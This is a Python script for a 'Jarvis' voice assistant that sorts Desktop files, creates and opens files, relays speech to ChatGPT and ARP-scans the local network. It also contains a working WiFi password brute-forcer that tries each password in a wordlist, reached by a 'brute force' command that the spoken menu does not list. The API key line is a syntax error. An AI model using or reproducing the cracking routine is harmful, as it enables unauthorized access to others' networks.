import os
import subprocess
import speech_recognition as sr
import shutil
import pyttsx3
from dotenv import load_dotenv
import openai
import pyowm
import pywifi
from pywifi import const
import time
from scapy.all import ARP, Ether, srp

# Load environment variables
load_dotenv()
OPENAI_KEY = #Add your own openAI APi Key 
openai.api_key = OPENAI_KEY

# Function to convert text to speech
def SpeakText(command):
    engine = pyttsx3.init()
    engine.say(command)
    engine.runAndWait()

# Function to sort files into folders
def sort_files(directory):
    engine = pyttsx3.init()
    engine.say("Starting file sorting process.")
    engine.runAndWait()

    # Define rules for sorting files into folders
    file_types = {
        'Documents': ['.txt', '.doc', '.docx', '.pdf'],
        'Images': ['.jpg', '.jpeg', '.png', '.gif'],
        'Videos': ['.mp4', '.avi', '.mov', '.mkv'],
        'Music': ['.mp3', '.wav', '.flac', '.aac'],
        'Code': ['.py', '.java', '.cpp', '.html', '.css', '.js'],
        'Others': []  # Default category for files not matching any other category
    }

    for filename in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, filename)):
            file_extension = os.path.splitext(filename)[1].lower()
            for category, extensions in file_types.items():
                if file_extension in extensions:
                    destination_folder = os.path.join(directory, category)
                    if not os.path.exists(destination_folder):
                        os.makedirs(destination_folder)
                    shutil.move(os.path.join(directory, filename), destination_folder)
                    engine.say(f"Moved {filename} to {category} folder.")
                    engine.runAndWait()
                    break
            else:
                destination_folder = os.path.join(directory, 'Others')
                if not os.path.exists(destination_folder):
                    os.makedirs(destination_folder)
                shutil.move(os.path.join(directory, filename), destination_folder)
                engine.say(f"Moved {filename} to Others folder.")
                engine.runAndWait()

    engine.say("File sorting process completed.")
    engine.runAndWait()

# Function to send user input to OpenAI Chat GPT
def send_to_chatGPT(messages, model="gpt-3.5-turbo"):
    response = openai.ChatCompletion.create(
        model=model,
        messages=messages,
        max_tokens=100,
        n=1,
        stop=None,
        temperature=0.5,
    )

    message = response.choices[0].message.content
    messages.append(response.choices[0].message)
    return message

# Function to create a new file
def create_file(directory, file_name, content):
    file_path = os.path.join(directory, file_name)
    with open(file_path, 'w') as file:
        file.write(content)
    print(f"File '{file_name}' created successfully at {directory}.")

# Function to scan devices on the network
def scan_devices(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=False)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

# Function to listen for the wake word "Hey Jarvis"
def listen_for_wake_word(r):
    with sr.Microphone() as source:
        print("Listening for wake word...")
        while True:
            audio = r.listen(source)
            try:
                # Use Google Speech Recognition to convert audio to text
                wake_word = r.recognize_google(audio).lower()
                if "hey jarvis" in wake_word:
                    return True
            except sr.UnknownValueError:
                pass
            except sr.RequestError as e:
                print(f"Could not request results from Google Speech Recognition service; {e}")
            return False

# Function to listen for commands

def takeCommand(r):
    with sr.Microphone() as source:
        r.adjust_for_ambient_noise(source)
        print("Listening...")
        audio = r.listen(source)

        try:
            text = r.recognize_google(audio)
            SpeakText(text)  # Talking back to the user
            return text
        except sr.UnknownValueError:
            print("Google Speech Recognition could not understand audio")
        except sr.RequestError as e:
            print(f"Could not request results from Google Speech Recognition service; {e}")

    return None

# Function to open a folder
def open_folder(folder_path):
    try:
        subprocess.Popen(['explorer', folder_path])
    except Exception as e:
        print("An error occurred:", e)

# Function to connect to WiFi network
def connect_to_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(5)
    if iface.status() == const.IFACE_CONNECTED:
        print(f"Successfully connected to {ssid} with password: {password}")
        return True
    else:
        return False

# Function to perform brute force attack on WiFi password
def brute_force(ssid, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8') as f:
        wordlist = f.read().splitlines()
    SpeakText("Cracking...")
    print("Cracking...")
    for password in wordlist:
        if connect_to_wifi(ssid, password):
            print(f"Successfully brute-forced WiFi password: {password}")
            return
    print("Failed to brute force WiFi password.")



def main():
    global current_folder_path
    
    # Initialize the recognizer
    r = sr.Recognizer()

    # Get the path to the desktop directory
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    
    # Initial message
    messages = [{"role": "user", "content": "Please act like Jarvis from Iron Man."}]

    # Listen for the wake word "Hey Jarvis"
    if listen_for_wake_word(r):
        print("Jarvis activated!")
        while True:
            print("Say 'open folder', 'sort files', 'create file', 'Ask a question', 'Scan network', or 'exit' to quit.")
            command = takeCommand(r)
            if command:
                if "exit" in command.lower():
                    print("Exiting...")
                    break
                elif "open folder" in command.lower():
                    SpeakText("Please say the name of the folder you want to open.")
                    folder_name = takeCommand(r)
                    if folder_name:
                        folder_path = os.path.join(desktop_path, folder_name)
                        open_folder(folder_path)
                    else:
                        print("Unable to get folder name.")
                elif "sort files" in command.lower():
                    SpeakText("Sorting files on the Desktop.")
                    sort_files(desktop_path)
                    print("Files sorted successfully.")
                elif "create file" in command.lower():
                    SpeakText("What should be the name of the file?")
                    file_name = takeCommand(r)
                    SpeakText("What should be written in the file?")
                    file_content = takeCommand(r)
                    if file_name and file_content:
                        create_file(desktop_path, file_name, file_content)
                        print("File created successfully.")
                elif "scan network" in command.lower():
                    SpeakText("Scanning devices on the network.")
                    ip_range = "192.168.1.1/24"  # Replace with your home network IP range
                    devices = scan_devices(ip_range)
                    print("Devices on the network:")
                    for device in devices:
                        print(f"IP: {device['ip']}, MAC: {device['mac']}")
                    SpeakText("Network scanning completed.")
                elif "brute force" in command.lower():
                    SpeakText("Please provide the SSID.")
                    ssid = input("SSID: ")
                    SpeakText("Please provide the path to the wordlist file.")
                    wordlist_path = input("Wordlist Path: ")
                    brute_force(ssid, wordlist_path)

                else:
                    # Append user message to messages list
                    messages.append({"role": "user", "content": command})

                    # Get response from OpenAI Chat GPT
                    response = send_to_chatGPT(messages)

                    # Speak response and append to messages list
                    SpeakText(response)
                    messages.append({"role": "AI", "content": response})
                    print(response)

if __name__ == "__main__":
    main()
